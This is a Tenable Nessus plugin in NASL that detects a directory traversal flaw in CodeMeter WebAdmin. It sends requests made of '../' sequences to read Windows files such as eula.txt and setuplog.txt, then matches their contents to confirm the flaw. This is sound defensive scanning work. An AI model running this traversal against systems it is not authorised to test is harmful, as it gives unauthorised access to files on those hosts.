#
# (C) Tenable Network Security, Inc.
#

include("compat.inc");

if (description)
{
  script_id(57801);
  script_version("$Revision: 1.4 $");
  script_cvs_date("$Date: 2015/02/23 16:10:44 $");

  script_bugtraq_id(49437);
  script_osvdb_id(76407);

  script_name(english:"CodeMeter Virtual Directory Traversal Arbitrary File Access");
  script_summary(english:"Tries to retrieve a .txt file from under the Window directory.");

  script_set_attribute(attribute:"synopsis", value:
"A web application on the remote host is affected by a directory
traversal vulnerability.");
  script_set_attribute(attribute:"description", value:
"According to its self-reported version, the CodeMeter WebAdmin server
installed on the remote host is prior to 4.30d (4.30.498.504). It is,
therefore, affected by a directory traversal vulnerability due to a
failure to properly sanitize HTTP requests for files in virtual
directories. An unauthenticated, remote attacker can exploit this
issue to retrieve the contents of arbitrary files on the remote host,
provided the target file is among a list of allowed extensions (for
example, 'txt', 'htm', 'html', 'images', etc.).");
  script_set_attribute(attribute:"see_also", value:"http://aluigi.altervista.org/adv/codemeter_1-adv.txt");
  script_set_attribute(attribute:"solution", value:"Upgrade to CodeMeter 4.30d (4.30.498.504) or later.");
  script_set_cvss_base_vector("CVSS2#AV:N/AC:M/Au:N/C:P/I:N/A:N");
  script_set_cvss_temporal_vector("CVSS2#E:F/RL:OF/RC:C");
  script_set_attribute(attribute:"exploitability_ease", value:"Exploits are available");
  script_set_attribute(attribute:"exploit_available", value:"true");

  script_set_attribute(attribute:"vuln_publication_date", value:"2011/09/02");
  script_set_attribute(attribute:"patch_publication_date", value:"2011/08/24");
  script_set_attribute(attribute:"plugin_publication_date", value:"2012/02/02");

  script_set_attribute(attribute:"plugin_type", value:"remote");
  script_set_attribute(attribute:"cpe", value:"cpe:/a:wibu:codemeter_runtime");
  script_end_attributes();

  script_category(ACT_ATTACK);
  script_family(english:"CGI abuses");

  script_copyright(english:"This script is Copyright (C) 2012-2015 Tenable Network Security, Inc.");

  script_dependencies("codemeter_webadmin_detect.nasl");
  script_require_keys("installed_sw/CodeMeter");
  script_require_ports("Services/www", 22350);

  exit(0);
}


include("audit.inc");
include("global_settings.inc");
include("misc_func.inc");
include("http.inc");
include("webapp_func.inc");

app = "CodeMeter";
get_install_count(app_name:app, exit_if_zero:TRUE);

port = get_http_port(default:22350, embedded:TRUE);

install = get_single_install(
  app_name : app,
  port    : port
);

disp_ver = install['display_version'];
dir = install['path'];
install_url = build_url(port:port,qs:dir);

# nb: these are relative to the Windows directory.
txt_files = make_list(
  'setuplog.txt',
  'system32/eula.txt',
  'SoftwareDistribution/selfupdate/wuident.txt',
  'SoftwareDistribution/WebSetup/wuident.txt'
);
txt_file_pats = make_array();
txt_file_pats['setuplog.txt'] = "(Time,File,Line,Tag,Message|SETUP: Calculating registry size)";
txt_file_pats['system32/eula.txt'] = "^END-USER LICENSE AGREEMENT FOR MICROSOFT";
txt_file_pats['SoftwareDistribution/selfupdate/wuident.txt'] = "^(\[SusClientUpdate\]$|ServerUrlEx=)";
txt_file_pats['SoftwareDistribution/WebSetup/wuident.txt'] = "^(\[SusClientUpdate\]$|ServerUrlEx=)";


# Try to exploit the issue to retrieve a file.
foreach file (txt_files)
{
  foreach windir (make_list("windows", "winnt"))
  {
    exploit = '$nessus/' + mult_str(str:"../", nb:12) + windir + '/' + file;

    url = dir + exploit;
    res = http_send_recv3(port:port, method:"GET", item:url, exit_on_fail:TRUE);

    headers = parse_http_headers(status_line:res[0], headers:res[1]);
    if (empty_or_null(headers)) audit(AUDIT_WEB_NO_SERVER_HEADER, port);

    if (headers['content-type'] && 'image/' >< headers['content-type'])
      audit(AUDIT_WEB_APP_NOT_AFFECTED, app, install_url, disp_ver);

    file_pat = txt_file_pats[file];
    if (!file_pat) exit(1, "No file pattern found for '"+file+"'.");

    if (egrep(pattern:file_pat, string:res[2]))
    {
      security_report_v4(
        port        : port,
        severity    : SECURITY_WARNING,
        file        : file,
        request     : make_list(build_url(qs:url, port:port)),
        output      : chomp(res[2]),
        attach_type : 'text/plain'
      );
      exit(0);
    }
  }
}
audit(AUDIT_WEB_APP_NOT_AFFECTED, app, install_url, disp_ver);
